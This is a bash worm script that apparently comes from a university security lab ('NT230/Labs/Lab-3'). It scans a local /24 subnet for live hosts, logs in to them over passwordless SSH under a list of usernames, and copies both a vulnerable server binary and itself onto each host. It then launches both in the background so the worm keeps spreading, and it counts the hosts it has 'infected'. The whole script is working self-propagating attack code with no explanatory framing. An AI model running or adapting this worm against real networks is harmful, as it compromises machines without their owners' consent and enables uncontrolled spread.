#!/bin/bash

# Worm script with parallel host discovery and faster execution
NETWORK_PREFIX="192.168.71"
PORT_BASE=4445
USERNAMES=("ubuntu" "server" "wanthinnn" "client")
ME=$(hostname -I | awk '{print $1}')
COUNT=0

echo "[*] Starting worm from $ME"

echo "[*] Discovering alive hosts..."
# Use fping if available for fastest discovery
if command -v fping >/dev/null 2>&1; then
    echo "[*] Using fping for host discovery"
    mapfile -t ALIVES < <(fping -a -g "${NETWORK_PREFIX}.1" "${NETWORK_PREFIX}.254" 2>/dev/null)
else
    echo "[*] Using parallel ping (20 processes) for host discovery"
    mapfile -t ALIVES < <(
        seq 1 254 | xargs -P20 -I{} bash -c 'ping -c1 -W1 '"${NETWORK_PREFIX}"'.{} &> /dev/null && echo '"${NETWORK_PREFIX}"'.{}'
    )
fi

TOTAL=${#ALIVES[@]}
echo "[*] Found $TOTAL alive hosts"

echo
# Iterate through alive hosts
for TARGET in "${ALIVES[@]}"; do
    [ "$TARGET" == "$ME" ] && continue
    echo "[+] $TARGET is up!"

    # Try each username
    for USER in "${USERNAMES[@]}"; do
        echo "[*] Trying user $USER@$TARGET..."
        ssh -o BatchMode=yes -o ConnectTimeout=3 $USER@$TARGET "echo 1" &> /dev/null
        if [ $? -eq 0 ]; then
            echo "[+] Found working user: $USER"

            # Copy payloads
            scp /home/wanthinnn/Documents/NT230/Labs/Lab-3/vul_server $USER@$TARGET:/tmp/vulserver &> /dev/null
            scp /tmp/worm.sh $USER@$TARGET:/tmp/worm.sh &> /dev/null

            # Assign reverse shell port
            PORT=$((PORT_BASE + COUNT))
            echo "[*] Assigning reverse shell port: $PORT"

            # Execute payloads in background
            ssh $USER@$TARGET "chmod +x /tmp/vulserver /tmp/worm.sh; \
                               nohup /tmp/vulserver $PORT >/dev/null 2>&1 & \
                               sleep 1; \
                               nohup bash /tmp/worm.sh >/dev/null 2>&1 &" &

            COUNT=$((COUNT + 1))
            break  # stop trying other usernames on this host
        fi
    done
done

echo "[*] Worm scan complete. Total targets infected: $COUNT"
